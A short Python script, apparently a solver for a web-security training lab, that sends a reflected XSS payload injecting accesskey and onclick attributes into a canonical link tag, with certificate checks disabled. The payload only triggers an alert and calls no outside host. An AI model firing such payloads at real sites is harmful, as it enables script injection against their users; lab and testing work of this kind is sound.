import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Reflected XSS in canonical link tag"

def run(url, payload, proxies=None):
    payload = "?'accesskey='X'onclick='alert()"
    try:
        r = requests.get(url.rstrip('/') + payload, verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False